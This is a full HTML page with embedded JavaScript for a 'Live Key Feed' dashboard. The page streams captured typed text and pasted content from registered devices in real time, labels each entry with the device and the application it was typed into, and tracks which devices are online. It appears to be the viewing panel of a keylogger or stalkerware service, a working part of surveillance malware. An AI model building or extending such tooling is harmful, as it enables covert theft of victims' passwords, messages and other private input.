<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Live Key Feed</title>
  <style>
    :root {
      --bg-1: #06131d;
      --bg-2: #101b2e;
      --panel: rgba(9, 15, 24, 0.88);
      --bubble: linear-gradient(135deg, #2563eb, #38bdf8);
      --pasted-bubble: linear-gradient(135deg, #b45309, #f59e0b);
      --text: #edf7ff;
      --muted: #9bb7d4;
      --accent: #7dd3fc;
      --border: rgba(148, 163, 184, 0.18);
      --shadow: rgba(0, 0, 0, 0.35);
    }

    * { box-sizing: border-box; }
    html, body {
      margin: 0;
      height: 100%;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background: radial-gradient(circle at top, rgba(56, 189, 248, 0.18), transparent 32%), linear-gradient(135deg, var(--bg-1), var(--bg-2));
      color: var(--text);
    }
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 32px;
    }
    .app {
      width: min(100%, 980px);
      height: min(88vh, 760px);
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: 28px;
      overflow: hidden;
      box-shadow: 0 28px 80px var(--shadow);
      display: flex;
      flex-direction: column;
      backdrop-filter: blur(12px);
    }
    .workspace {
      display: grid;
      grid-template-columns: 230px minmax(0, 1fr) 220px;
      flex: 1;
      min-height: 0;
    }
    .sidebar {
      padding: 20px 16px;
      border-right: 1px solid var(--border);
      background: rgba(10, 15, 24, 0.56);
    }
    .sidebar h2 {
      margin: 0 0 18px;
      color: var(--accent);
      font-size: 0.72rem;
      letter-spacing: 0.12em;
      text-transform: uppercase;
    }
    .metric {
      padding: 12px 0;
      border-top: 1px solid var(--border);
    }
    .metric-label {
      display: block;
      margin-bottom: 5px;
      color: var(--muted);
      font-size: 0.68rem;
      text-transform: uppercase;
      letter-spacing: 0.06em;
    }
    .metric-value {
      display: block;
      font-size: 0.82rem;
      line-height: 1.4;
      overflow-wrap: anywhere;
    }
    .feed-panel {
      display: flex;
      min-width: 0;
      min-height: 0;
      flex-direction: column;
    }
    .devices-panel {
      min-width: 0;
      padding: 20px 16px;
      border-left: 1px solid var(--border);
      background: rgba(10, 15, 24, 0.56);
      overflow-y: auto;
    }
    .devices-heading {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 8px;
      margin-bottom: 16px;
    }
    .devices-heading h2 {
      margin: 0;
      color: var(--accent);
      font-size: 0.72rem;
      letter-spacing: 0.12em;
      text-transform: uppercase;
    }
    .device-count {
      color: var(--muted);
      font-size: 0.7rem;
    }
    .device-list {
      display: grid;
      gap: 10px;
    }
    .device-row {
      padding: 10px 0;
      border-top: 1px solid var(--border);
    }
    .device-name {
      display: block;
      overflow-wrap: anywhere;
      font-size: 0.78rem;
      font-weight: 700;
    }
    .device-id,
    .device-seen {
      display: block;
      margin-top: 4px;
      color: var(--muted);
      font-size: 0.66rem;
      overflow-wrap: anywhere;
    }
    .device-state {
      display: inline-flex;
      align-items: center;
      gap: 5px;
      margin-top: 7px;
      font-size: 0.66rem;
      font-weight: 700;
    }
    .device-state::before {
      width: 7px;
      height: 7px;
      border-radius: 50%;
      background: #64748b;
      content: "";
    }
    .device-state.online { color: #86efac; }
    .device-state.online::before {
      background: #22c55e;
      box-shadow: 0 0 10px rgba(34, 197, 94, 0.8);
    }
    .topbar {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 18px 20px;
      background: rgba(10, 15, 24, 0.9);
      border-bottom: 1px solid var(--border);
    }
    .brand {
      display: flex;
      align-items: center;
      gap: 10px;
      font-weight: 700;
      letter-spacing: 0.14em;
      text-transform: uppercase;
      font-size: 0.72rem;
      color: var(--accent);
    }
    .dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: #22c55e;
      box-shadow: 0 0 14px rgba(34, 197, 94, 0.9);
    }
    .status {
      padding: 14px 20px 0;
      color: var(--muted);
      font-size: 0.8rem;
      letter-spacing: 0.02em;
    }
    .feed {
      flex: 1;
      overflow-y: auto;
      padding: 18px 18px 24px;
      background: rgba(2, 6, 12, 0.12);
      scroll-behavior: smooth;
    }
    .bubble-wrap {
      display: flex;
      justify-content: flex-start;
      margin: 12px 0;
      animation: rise 0.22s ease;
    }
    .bubble {
      max-width: 78%;
      background: var(--bubble);
      border: 1px solid rgba(255,255,255,0.12);
      border-radius: 18px 18px 18px 6px;
      padding: 12px 14px 10px;
      box-shadow: 0 12px 28px rgba(0,0,0,0.2);
      white-space: pre-wrap;
      word-break: break-word;
      line-height: 1.55;
    }
    .bubble.pasted {
      background: var(--pasted-bubble);
      border-color: rgba(253, 230, 138, 0.5);
    }
    .paste-label {
      display: block;
      margin-bottom: 6px;
      color: #fffbeb;
      font-size: 0.62rem;
      font-weight: 800;
      letter-spacing: 0.12em;
      text-transform: uppercase;
    }
    .time {
      display: block;
      margin-top: 6px;
      opacity: 0.82;
      font-size: 0.68rem;
      text-align: right;
    }
    .device {
      display: block;
      margin-top: 3px;
      opacity: 0.72;
      font-size: 0.64rem;
      text-align: left;
    }
    .source {
      display: block;
      margin-top: 3px;
      opacity: 0.82;
      font-size: 0.66rem;
      text-align: left;
    }
    @keyframes rise {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    @media (max-width: 700px) {
      body { padding: 12px; }
      .app { height: 94vh; border-radius: 18px; }
      .workspace { grid-template-columns: 1fr; }
      .sidebar {
        display: grid;
        grid-template-columns: repeat(3, 1fr);
        gap: 10px;
        padding: 12px 14px;
        border-right: 0;
        border-bottom: 1px solid var(--border);
      }
      .sidebar h2 { grid-column: 1 / -1; margin: 0; }
      .metric { padding: 0; border-top: 0; }
      .metric-value { font-size: 0.72rem; }
      .devices-panel {
        border-top: 1px solid var(--border);
        border-left: 0;
        max-height: 190px;
      }
    }
  </style>
</head>
<body>
  <div class="app">
    <div class="topbar">
      <div class="brand"><span class="dot"></span> Live Key Feed</div>
    </div>
    <div class="workspace">
      <aside class="sidebar" aria-label="Service status">
        <h2>Service status</h2>
        <div class="metric">
          <span class="metric-label">Started</span>
          <span class="metric-value" id="startedAt">Loading…</span>
        </div>
        <div class="metric">
          <span class="metric-label">Current uptime</span>
          <span class="metric-value" id="uptime">Loading…</span>
        </div>
        <div class="metric">
          <span class="metric-label">Messages stored</span>
          <span class="metric-value" id="messageCount">0</span>
        </div>
      </aside>
      <section class="feed-panel">
        <div class="status" id="status">Waiting for live stream…</div>
        <div class="feed" id="feed"></div>
      </section>
      <aside class="devices-panel" aria-label="Connected devices">
        <div class="devices-heading">
          <h2>Devices</h2>
          <span class="device-count" id="deviceCount">0</span>
        </div>
        <div class="device-list" id="deviceList">
          <span class="device-seen">Loading...</span>
        </div>
      </aside>
    </div>
  </div>

  <script>
    const feed = document.getElementById('feed');
    const statusEl = document.getElementById('status');
    const startedAtEl = document.getElementById('startedAt');
    const uptimeEl = document.getElementById('uptime');
    const messageCountEl = document.getElementById('messageCount');
    const deviceCountEl = document.getElementById('deviceCount');
    const deviceListEl = document.getElementById('deviceList');
    let serviceStartedAt = null;
    let serviceUptime = 0;

    function formatTime(ts) {
      return new Date(ts).toLocaleString([], {
        dateStyle: 'medium',
        timeStyle: 'medium'
      });
    }

    function formatUptime(seconds) {
      const days = Math.floor(seconds / 86400);
      const hours = Math.floor((seconds % 86400) / 3600);
      const minutes = Math.floor((seconds % 3600) / 60);
      const remainingSeconds = seconds % 60;
      return `${days}d ${hours}h ${minutes}m ${remainingSeconds}s`;
    }

    function updateUptime() {
      if (serviceStartedAt === null) return;
      serviceUptime += 1;
      uptimeEl.textContent = formatUptime(serviceUptime);
    }

    async function loadDevices() {
      try {
        const res = await fetch('/api/devices');
        if (!res.ok) throw new Error('device check failed');
        const devices = await res.json();
        deviceCountEl.textContent = devices.length;
        deviceListEl.innerHTML = '';
        if (!devices.length) {
          deviceListEl.innerHTML = '<span class="device-seen">No devices registered</span>';
          return;
        }
        devices.forEach((device) => {
          const row = document.createElement('div');
          row.className = 'device-row';

          const name = document.createElement('span');
          name.className = 'device-name';
          name.textContent = device.name || 'Unknown device';

          const id = document.createElement('span');
          id.className = 'device-id';
          id.textContent = `ID: ${device.id || 'unknown'}`;

          const state = document.createElement('span');
          state.className = `device-state${device.online ? ' online' : ''}`;
          state.textContent = device.online ? 'Online' : 'Offline';

          const uptime = document.createElement('span');
          uptime.className = 'device-seen';
          uptime.textContent = `Uptime: ${formatUptime(device.uptime_seconds || 0)}`;

          const seen = document.createElement('span');
          seen.className = 'device-seen';
          seen.textContent = device.last_seen
            ? `Last seen: ${formatTime(device.last_seen)}`
            : 'Last seen: unknown';

          row.append(name, id, state, uptime, seen);
          deviceListEl.appendChild(row);
        });
      } catch (err) {
        deviceListEl.innerHTML = '<span class="device-seen">Unavailable</span>';
      }
    }

    async function loadHealth() {
      try {
        const res = await fetch('/health');
        if (!res.ok) throw new Error('health check failed');
        const health = await res.json();
        serviceStartedAt = health.started_at;
        serviceUptime = health.uptime_seconds;
        startedAtEl.textContent = formatTime(serviceStartedAt);
        messageCountEl.textContent = health.count;
        updateUptime();
      } catch (err) {
        startedAtEl.textContent = 'Unavailable';
        uptimeEl.textContent = 'Unavailable';
      }
    }

    function addMessage(msg) {
      const wrap = document.createElement('div');
      wrap.className = 'bubble-wrap';

      const bubble = document.createElement('div');
      bubble.className = `bubble${msg.is_pasted ? ' pasted' : ''}`;
      bubble.textContent = msg.text;

      if (msg.is_pasted) {
        const label = document.createElement('span');
        label.className = 'paste-label';
        label.textContent = 'Pasted';
        bubble.prepend(label);
      }

      const time = document.createElement('span');
      time.className = 'time';
      time.textContent = formatTime(msg.time);
      bubble.appendChild(time);

      const device = document.createElement('span');
      device.className = 'device';
      device.textContent = `From device ${msg.device_id || 'unknown'}${msg.device_name ? ` (${msg.device_name})` : ''}`;
      bubble.appendChild(device);

      const source = document.createElement('span');
      source.className = 'source';
      source.textContent = `Entered in: ${msg.app_name || 'Unknown app'}`;
      bubble.appendChild(source);

      wrap.appendChild(bubble);
      feed.appendChild(wrap);
      messageCountEl.textContent = feed.children.length;
      feed.scrollTop = feed.scrollHeight;
    }

    async function loadInitialMessages() {
      try {
        const res = await fetch('/messages');
        if (!res.ok) throw new Error('failed');
        const messages = await res.json();
        feed.innerHTML = '';
        messages.forEach(addMessage);
        messageCountEl.textContent = messages.length;
        statusEl.textContent = 'Latest messages: ' + messages.length;
      } catch (err) {
        statusEl.textContent = 'Listening for new messages…';
      }
    }

    const eventSource = new EventSource('/events');
    eventSource.onmessage = (event) => {
      const msg = JSON.parse(event.data);
      addMessage(msg);
      statusEl.textContent = 'Live stream connected';
    };
    eventSource.onerror = () => {
      statusEl.textContent = 'Reconnect in progress…';
    };

    loadInitialMessages();
    loadHealth();
    loadDevices();
    setInterval(updateUptime, 1000);
    setInterval(loadHealth, 30000);
    setInterval(loadDevices, 30000);
  </script>
</body>
</html>
